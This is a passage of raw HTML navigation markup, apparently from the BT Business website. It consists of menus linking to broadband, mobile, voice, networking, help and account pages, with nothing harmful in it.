                                    <a class="sub-category" href="https://business.bt.com/insights.html/?filters=%5Btopic%5DThe+future+is+now">The future is now</a> <a class="sub-category" href="https://business.bt.com/insights/digital-transformation/">Digital transformation</a> <a class="sub-category" href="https://business.bt.com/insights/remote-working/">Remote working</a> <a class="sub-category" href="https://business.bt.com/insights/digital-skills/">Digital skills</a> <a class="sub-category" href="https://business.bt.com/solutions/tech-start-up-bursary/">Small business support scheme</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Technology
                                  	</div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights/digital-transformation/ip-solutions/">IP technology</a> <a class="sub-category" href="https://business.bt.com/solutions/5g-bt-for-business/">5G</a> <a class="sub-category" href="https://business.bt.com/insights/cyber-security/cyber-security-solutions-and-services/">Cyber security</a> <a class="sub-category" href="https://business.bt.com/insights/5g/network-story/">Connectivity</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
									<div class="category">
										<div class="title">
                                        	Events
                                 	 	</div>
                                	</div>
                                	<div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights/events/">Events</a> 
                                	</div>
								</div>
                                <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Public sector solutions
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/solutions/public-sector/">Public sector solutions</a>
                                
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion nav-accordion large-corporate">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title"></div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link">
                            <div class="link"></div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Get help
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5055">Broadband &amp; internet</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5056">Phone line &amp; services</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5057">Office phones &amp; systems</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5059">Email, computing &amp; hosting</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5060">Mobile services</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5058">Billing</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Get in touch
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/help/contact-us-business/#buy">Contact BT Business</a> <a class="sub-category" href="https://business.bt.com/moving-premises">Moving premises</a> <a class="sub-category" href="https://business.bt.com/help/contact-us-business/#closeaccount">Close an account</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Tools
                                    </div>
                                </div>
                                <div class="sub-categories">
                                <a class="sub-category" href="https://business.bt.com/self-service/">Self-service with 'My account'</a> <a class="sub-category" href="https://secure.business.bt.com/Hub">My account</a> <a class="sub-category" href="https://secure.business.bt.com/Hub/?TYPE=33554433&amp;REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=senroGWh8TGVp8dKtT7ws0RFCMev5xVSoaPazTTmmXjVQBUO1b0FeZgu7vZkZTtD&amp;TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d1">Billing & payments</a> <a class="sub-category" href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html?ref=true">Pay bill</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=3">Report or track a fault</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=3">Track an order</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/service_status">Service status</a> <a class="sub-category" href="https://business.bt.com/comms/business-app/">Download the BT Business app</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Useful links
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://secure.business.bt.com/Hub/?TYPE=33554433&amp;REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=$SM$EZgATSXs8vWyol20%2b2QIjkOqMYn%2fZjUFYXW3AScMIR51DY8xcbHSEefKPxnW7oPV&amp;TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d2">Email</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=6">Manage your services</a> <a class="sub-category" href="https://btsportbusiness.com/">BT Sport for business</a> <a class="sub-category" href="https://business.bt.com/bt-local-business/">Find a local sales person</a> <a class="sub-category" href="https://business.forums.bt.com">Business forum</a> <a class="sub-category" href="https://www.bt.com/help/home/">BT for the home</a> <a class="sub-category" href="https://business.bt.com/help/how-are-we-doing/" data-polaris-omtrack="Polaris:Nav:Performance results ">Performance results</a> <a class="sub-category" href="https://www.bt.com/skillsfortomorrow/work-life" data-polaris-omtrack="Polaris:Nav:Free support for your business">Free support for your business</a>
					
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion nav-accordion public-sector">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title">
							Insights
							</div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link" href="https://business.bt.com/insights/">
                            <div class="link">
                                Insights
                            </div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        The future of work
                                  </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights.html/?filters=%5Btopic%5DThe+future+is+now">The future is now</a> <a class="sub-category" href="https://business.bt.com/insights/digital-transformation/">Digital transformation</a> <a class="sub-category" href="https://business.bt.com/insights/remote-working/">Remote working</a> <a class="sub-category" href="https://business.bt.com/insights/digital-skills/">Digital skills</a> <a class="sub-category" href="https://business.bt.com/solutions/tech-start-up-bursary/">Small business support scheme</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Technology
                                  	</div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights/digital-transformation/ip-solutions/">IP technology</a> <a class="sub-category" href="https://business.bt.com/solutions/5g-bt-for-business/">5G</a> <a class="sub-category" href="https://business.bt.com/insights/cyber-security/cyber-security-solutions-and-services/">Cyber security</a> <a class="sub-category" href="https://business.bt.com/insights/5g/network-story/">Connectivity</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
									<div class="category">
										<div class="title">
                                        	Events
                                 	 	</div>
                                	</div>
                                	<div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights/events/">Events</a> 
                                	</div>
								</div>
                                <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Public sector solutions
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/solutions/public-sector/">Public sector solutions</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion nav-accordion public-sector">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title"></div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link">
                            <div class="link"></div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Get help
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5055">Broadband &amp; internet</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5056">Phone line &amp; services</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5057">Office phones &amp; systems</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5059">Email, computing &amp; hosting</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5060">Mobile services</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5058">Billing</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">

                                <div class="category">
                                    <div class="title">
                                        Get in touch
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/help/contact-us-business/#buy">Contact BT Business</a> <a class="sub-category" href="https://business.bt.com/moving-premises">Moving premises</a> <a class="sub-category" href="https://business.bt.com/help/contact-us-business/#closeaccount">Close an account</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Tools
                                    </div>
                                </div>
                                <div class="sub-categories">
                                <a class="sub-category" href="https://business.bt.com/self-service/">Self-service with 'My account'</a> <a class="sub-category" href="https://secure.business.bt.com/Hub">My account</a> <a class="sub-category" href="https://secure.business.bt.com/Hub/?TYPE=33554433&amp;REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=senroGWh8TGVp8dKtT7ws0RFCMev5xVSoaPazTTmmXjVQBUO1b0FeZgu7vZkZTtD&amp;TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d1">Billing & payments</a> <a class="sub-category" href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html?ref=true">Pay bill</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=3">Report or track a fault</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=3">Track an order</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/service_status">Service status</a> <a class="sub-category" href="https://business.bt.com/comms/business-app/">Download the BT Business app</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Useful links
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://secure.business.bt.com/Hub/?TYPE=33554433&amp;REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=$SM$EZgATSXs8vWyol20%2b2QIjkOqMYn%2fZjUFYXW3AScMIR51DY8xcbHSEefKPxnW7oPV&amp;TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d2">Email</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=6">Manage your services</a> <a class="sub-category" href="https://btsportbusiness.com/">BT Sport for business</a> <a class="sub-category" href="https://business.bt.com/bt-local-business/">Find a local sales person</a> <a class="sub-category" href="https://business.forums.bt.com">Business forum</a> <a class="sub-category" href="https://www.bt.com/help/home/">BT for the home</a> <a class="sub-category" href="https://business.bt.com/help/how-are-we-doing/" data-polaris-omtrack="Polaris:Nav:Performance results ">Performance results</a> <a class="sub-category" href="https://www.bt.com/skillsfortomorrow/work-life" data-polaris-omtrack="Polaris:Nav:Free support for your business">Free support for your business</a>
					
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="my-account">
                        <a id="polaris-log-in-mob" class="my-account-button button" href="https://secure.business.bt.com/Hub">Log in / Register</a>
                        <a id="polaris-log-out-mob" class="my-account-button button" href="https://secure.business.bt.com/LogoutCDE.ashx" style="display:none">Logout</a>
                    </div>
                </div>
                <div aria-labelledby="bt-global-nav" class="global-nav nav sme" role="navigation">
                    <a class="header-dropdown-button products" href="https://business.bt.com/products/" id="productsLink">
                    <div class="nav-link">
                        Products &amp; services
                    </div></a> <a class="header-dropdown-button solutions" href="https://business.bt.com/insights/" id="solutionsLink">
                    <div class="nav-link">
                        Insights
                    </div></a> <a class="header-dropdown-button support" href="https://btbusiness.custhelp.com/app/home/" id="supportLink">
                    <div class="nav-link">
                        Help
                    </div></a>
                </div>
                <div aria-labelledby="bt-global-nav" class="global-nav nav corporate" role="navigation">
                    <a class="header-dropdown-button products" id="productsLink">
                    <div class="nav-link"></div></a> <a class="header-dropdown-button solutions" id="solutionsLink">
                    <div class="nav-link"></div></a> <a class="header-dropdown-button support" id="supportLink">
                    <div class="nav-link"></div></a>
                </div>
                <div aria-labelledby="bt-global-nav" class="global-nav nav large-corporate" role="navigation">
                    <a class="header-dropdown-button solutions" id="solutionsLink">
                    <div class="nav-link"></div></a> <a class="header-dropdown-button support" id="supportLink">
                    <div class="nav-link"></div></a>
                </div>
                <div aria-labelledby="bt-global-nav" class="global-nav nav public-sector" role="navigation">
                    <a class="header-dropdown-button solutions" id="solutionsLink">
                    <div class="nav-link"></div></a> <a class="header-dropdown-button support" id="supportLink">
                    <div class="nav-link"></div></a>
                </div>
                <div class="channel-selector-desktop">
                    <div class="channel-selector" style="display: none;">
                        <div class="channel-selector-label">
                            Your business type:
                        </div>
                        <div class="channel-selected channel-selected-identifier">
                            Small &amp; medium
                        </div>
                        <div class="channels">
                            <div class="channel">
                                <a class="channel-link channel-identifier" data-hub="sme" data-schid="sme" href="/sme/">Small &amp; medium</a>
                            </div>
                            <div class="channel">
                                <a class="channel-link channel-identifier" data-schid="corporate" href="/corporate/">Corporate</a>
                            </div>
                            <div class="channel">
                                <a class="channel-link channel-identifier" data-schid="large-corporate" href="/large-corporate/">Large corporate</a>
                            </div>
                            <div class="channel">
                                <a class="channel-link channel-identifier" data-schid="public-sector" href="/public-sector/">Public sector</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="header-icons">
                <div class="basket sme" style="display: none;">
                    <a href="/basket/"><img class="icon" src="https://btbsecure.business.bt.com/commonContent/img/icons/basket.svg"></a>
                </div>
                <div class="basket corporate" style="display: none;">
                    <a href="/basket/"><img class="icon" src="https://btbsecure.business.bt.com/commonContent/img/icons/basket.svg"></a>
                </div>
                <div class="search">
                    <img class="search-icon icon" src="https://btbsecure.business.bt.com/commonContent/img/icons/search.svg">
                    <div class="search-bar">
                    <form action="/search.html" data-isendeca="false" id="searchbar" method="get" name="searchbar" role="search">
                        <input class="search-input" name="q" placeholder="Search BT Business" type="search">
                    </form><img alt="" class="search-bar-close" src="https://btbsecure.business.bt.com/commonContent/img/icons/search-clear.svg"></div>
                </div>
            </div><a id="polaris-log-in" class="account" href="https://secure.business.bt.com/Hub">
            <div class="account-text">
                Log in / Register
            </div></a>
            <a id="polaris-log-out" style="display: none" class="account" href="https://secure.business.bt.com/LogoutCDE.ashx">
                <div class="account-text">
                    Log out
                </div></a>
            <div class="header-menu-buttons"><img alt="" class="menu" src="https://btbsecure.business.bt.com/commonContent/img/icons/hamburger.svg"> <img alt="" class="close" src="https://btbsecure.business.bt.com/commonContent/img/icons/close.svg"></div>
        </div>
        <div class="meganav productsServicesNav sme">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/broadband-and-internet/" data-polaris-omtrack="Polaris:Nav:Broadband">Broadband</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/deals/" data-polaris-omtrack="Polaris:Nav:Broadband deals">Broadband deals</a>
                    </div>
					 <div class="meganav-link-container">
					<a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/halo-for-business/" data-polaris-omtrack="Polaris:Nav:BT Halo for business">BT Halo for business</a>
					</div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/full-fibre/" data-polaris-omtrack="Polaris:Nav:Full Fibre">Full Fibre</a>
                    </div>                    
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/broadband-only/" data-polaris-omtrack="Polaris:Nav:Broadband only">Broadband only</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/mobile-packages/" data-polaris-omtrack="Polaris:Nav:Broadband Deals with Mobile">Broadband Deals with Mobile</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/guest-wifi/" data-polaris-omtrack="Polaris:Nav:Guest WiFi">Guest Wi-Fi</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/bt-leased-line/" data-polaris-omtrack="Polaris:Nav:BTnet leased line">BTnet leased line</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/mobile/">Mobile</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/phones/">Phones</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/sim-only/">SIM-only</a>
                    </div>
<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/tablets/">Tablets</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/mobile-broadband/">Mobile broadband</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/upgrades/">Upgrade mobile</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/5plus-employees/">5+ employees</a>
                    </div>
                </div>
				<div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/voice/">Voice</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/phone-lines/">Phone lines & Featureline</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/isdn/">ISDN</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/conferencing/">Conferencing</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/numbers/">Business numbers</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/payphone-services/">Payphone services</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/phone-lines/calling-features/">Call diversion</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/business-phone-systems/">Phone systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/business-phone-systems/on-premises/">On-premises phone systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/business-phone-systems/voip/">VoIP phone systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/business-phone-systems/bt-cloudvoice-sip/">BT Cloud Voice SIP</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/business-phone-systems/one-phone/">BT One Phone</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/networking/">Networking</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/bt-leased-line/">BTnet leased line</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/networking/ethernet-vpn/">Ethernet VPN</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/networking/ethernet-point-to-point/">Ethernet Point-to-Point</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/networking/ip-connect/">IP Connect</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/networking/managed-wan/">Managed WAN</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/it-datacentre-services/">IT</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/cyber-security-sme/">SME security solutions</a>
                    </div>
                   <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/it-datacentre-services/bring-your-own-device/">Bring Your Own Device</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/it-datacentre-services/data-centre-solutions/">Cloud &amp; Data Centre Solutions</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/computing-apps/domain-registration/">Domain registration</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/computing-apps/business-apps/">Business Apps</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/computing-apps/">Computing & apps</a>
                    </div>                    
                </div>
            </div>
        </div>
        <div class="meganav solutionsNav sme">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">The future of work</div>
                    </div>
                     <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights.html/?filters=%5Btopic%5DThe+future+is+now">The future is now</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-transformation/">Digital transformation</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/remote-working/">Remote working</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-skills/">Digital skills</a>
                    </div>
                    <div class="meganav-link-container">
						<a class="meganav-link" href="https://business.bt.com/solutions/tech-start-up-bursary/">Small business support scheme</a>
					</div>
               </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">Technology</div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-transformation/ip-solutions/">IP technology</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/solutions/5g-bt-for-business/">5G</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/cyber-security/cyber-security-solutions-and-services/">Cyber security</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/5g/network-story/">Connectivity</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/insights/events/">Events</a>
                    </div>
                </div>
<!--                 <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            <a href="https://business.bt.com/solutions/public-sector/">Public sector solutions</a>
                        </div>
                    </div>
                </div> -->
            </div>
        </div>
        <div class="meganav supportNav sme">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Get help
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5055">Broadband &amp; internet</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5056">Phone line &amp; services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5057">Office phones &amp; systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5059">Email, computing &amp; hosting</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5060">Mobile services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5058">Billing</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Get in touch
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/help/contact-us-business/#buy">Contact BT Business</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/moving-premises">Moving premises</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/help/contact-us-business/#closeaccount">Close an account</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Tools
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link " href="https://business.bt.com/self-service/">Self-service with 'My account'</a>
					</div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub">My account</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=senroGWh8TGVp8dKtT7ws0RFCMev5xVSoaPazTTmmXjVQBUO1b0FeZgu7vZkZTtD&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d1">Billing & payments</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html?ref=true">Pay bill</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=4">Report or track a fault</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=3">Track an order</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/service_status">Service status</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/comms/business-app/">Download the BT Business App</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Useful links
                        </div>
                    </div>

                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=$SM$EZgATSXs8vWyol20%2b2QIjkOqMYn%2fZjUFYXW3AScMIR51DY8xcbHSEefKPxnW7oPV&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d2">Email</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=6">Manage your services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btsportbusiness.com/">BT Sport for business</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/bt-local-business/">Find a local sales person</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.forums.bt.com">Business forum</a>
                    </div>
                   <div class="meganav-link-container">
                        <a class="meganav-link" href="https://www.bt.com/help/home/">BT for the home</a>
                    </div>
					<div class="meganav-link-container">
						<a class="meganav-link" href="https://business.bt.com/help/how-are-we-doing/" data-polaris-omtrack="Polaris:Nav:Performance results ">Performance results </a>
					</div>
					<div class="meganav-link-container">
						<a class="meganav-link" href="https://www.bt.com/skillsfortomorrow/work-life" data-polaris-omtrack="Polaris:Nav:Free support for your business">Free support for your business </a>
					</div>
                </div>
            </div>
        </div>
        <div class="meganav productsServicesNav corporate">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/broadband-and-internet/">Broadband</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/deals/">Broadband deals</a>
                    </div>
					<div class="meganav-link-container">
					<a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/halo-for-business/">BT Halo for business</a>
					</div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/full-fibre/" data-polaris-omtrack="Polaris:Nav:Full Fibre">Full Fibre</a>
                    </div>                    
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/broadband-only/" data-polaris-omtrack="Polaris:Nav:Broadband only">Broadband only</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/mobile-packages/" data-polaris-omtrack="Polaris:Nav:Broadband Deals with Mobile">Broadband Deals with Mobile</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/guest-wifi/" data-polaris-omtrack="Polaris:Nav:Guest WiFi">Guest Wi-Fi</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/bt-leased-line/" data-polaris-omtrack="Polaris:Nav:BTnet leased line">BTnet leased line</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/mobile/">Mobile</a>
                    </div>
